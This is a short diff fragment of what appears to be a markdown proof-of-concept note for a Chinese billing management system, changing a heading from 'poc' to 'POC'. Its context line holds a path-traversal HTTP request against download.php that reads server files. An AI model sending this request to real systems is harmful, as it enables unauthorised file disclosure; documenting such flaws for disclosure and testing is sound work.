@@ -10,7 +10,7 @@ title="蓝海卓越计费管理系统"
 
 
 
-## poc
+## POC
 
 ```
 GET /download.php?file=../../../../../usr/local/usr-gui/download.php HTTP/1.1
